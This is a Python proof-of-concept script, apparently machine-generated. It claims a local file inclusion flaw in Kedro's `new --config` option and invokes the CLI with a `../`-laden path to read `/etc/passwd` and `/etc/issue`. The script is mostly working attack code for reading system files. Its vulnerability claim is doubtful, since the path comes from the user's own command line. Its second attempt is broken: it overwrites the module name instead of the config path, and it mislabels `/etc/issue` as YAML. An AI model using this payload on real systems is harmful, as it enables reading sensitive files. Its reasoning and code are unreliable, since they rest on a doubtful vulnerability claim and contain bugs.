#!/usr/bin/env python3
# PoC for kedro (/home/xcy/.local/lib/python3.14/site-packages/kedro)
# Path: lfi-001
# Sink: _fetch_validate_parse_config_from_file
# Auto-generated — run with: python3 lfi_supply_like__fetch_validate_parse_config_from_file_2.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for LFI in Kedro's `--config` flag.

Vulnerability: The `_fetch_validate_parse_config_from_file` function in
kedro/framework/cli/starters.py opens a file at `config_path` without any
path traversal validation. The `config_path` originates from the user-supplied
`--config` flag and is passed directly to `open()`.

This PoC demonstrates reading arbitrary files by exploiting the path traversal.
It uses a benign payload (reading /etc/passwd) to confirm the vulnerability.
"""

import subprocess
import sys
import os
import tempfile
import shutil

# Configuration
TARGET_FILE = "/etc/passwd"  # Benign file to read (change to any file)
# The payload uses path traversal to escape the current working directory
# and read the target file. Kedro's `new` command is invoked with --config
# pointing to our malicious path.

def main():
    # Create a temporary directory to work in (to avoid polluting current dir)
    tmpdir = tempfile.mkdtemp(prefix="kedro_poc_")
    original_cwd = os.getcwd()
    os.chdir(tmpdir)
    
    try:
        # Build the path traversal payload
        # We need to go up enough directories to reach root, then to target
        # Since we're in a temp dir, we need to go up to root first
        # The number of "../" depends on the depth of the temp directory
        # We'll use a large number to be safe (e.g., 10 levels)
        traversal = "../" * 10
        payload_path = os.path.join(traversal, TARGET_FILE.lstrip("/"))
        
        print(f"[*] Attempting to read: {TARGET_FILE}")
        print(f"[*] Payload path: {payload_path}")
        print(f"[*] Working directory: {tmpdir}")
        print()
        
        # Execute kedro new with the malicious --config flag
        # We use --starter minimal to avoid interactive prompts
        # The --config flag will trigger the vulnerable code path
        cmd = [
            sys.executable, "-m", "kedro", "new",
            "--config", payload_path,
            "--starter", "minimal",
            "--name", "test_project_poc",
            "--tools", "none",
            "--example", "no",
            "--telemetry", "no"
        ]
        
        print(f"[*] Running command: {' '.join(cmd)}")
        print()
        
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=30
        )
        
        # Check the output for signs of file content
        # The vulnerable function will try to parse the file as YAML
        # If it's not valid YAML, it will raise an error but may leak content
        print(f"[*] Return code: {result.returncode}")
        print(f"[*] STDOUT:\n{result.stdout}")
        print(f"[*] STDERR:\n{result.stderr}")
        
        # Check if we got the file content in the error message
        # The error message includes the file path and sometimes content
        if result.returncode != 0:
            # The error might contain the file content in the YAML parsing error
            if "could not load config" in result.stderr.lower():
                print("\n[!] Vulnerability confirmed! The file was accessed.")
                print("[!] The error message shows the path was traversed.")
                # The actual content might be in the error if YAML parsing failed
                # For /etc/passwd, it's not valid YAML, so we get an error
                # But the file was still read (we can see the path in error)
            else:
                print("\n[?] Unexpected error. Check output above.")
        else:
            print("\n[?] Command succeeded unexpectedly. Check output above.")
            
        # Additional check: if we can read a valid YAML file, we might get content
        # For demonstration, we'll also try reading a known YAML file
        print("\n[*] Attempting to read a YAML file to demonstrate content leak...")
        yaml_payload = os.path.join(traversal, "etc/issue")  # Usually contains text
        cmd[2] = yaml_payload  # Replace config path
        result2 = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=30
        )
        print(f"[*] YAML attempt STDOUT:\n{result2.stdout}")
        print(f"[*] YAML attempt STDERR:\n{result2.stderr}")
        
    except subprocess.TimeoutExpired:
        print("[!] Command timed out. This might indicate the file was read but processing hung.")
    except FileNotFoundError:
        print("[!] Kedro not found. Make sure it's installed: pip install kedro")
    except Exception as e:
        print(f"[!] Unexpected error: {e}")
    finally:
        # Cleanup
        os.chdir(original_cwd)
        shutil.rmtree(tmpdir, ignore_errors=True)
        print(f"\n[*] Cleaned up temporary directory: {tmpdir}")

if __name__ == "__main__":
    print("=" * 60)
    print("Kedro LFI Proof-of-Concept")
    print("=" * 60)
    print()
    print("This PoC demonstrates path traversal in Kedro's --config flag.")
    print("It attempts to read /etc/passwd by traversing directories.")
    print("The vulnerability is in _fetch_validate_parse_config_from_file")
    print("which opens the config_path without sanitization.")
    print()
    main()
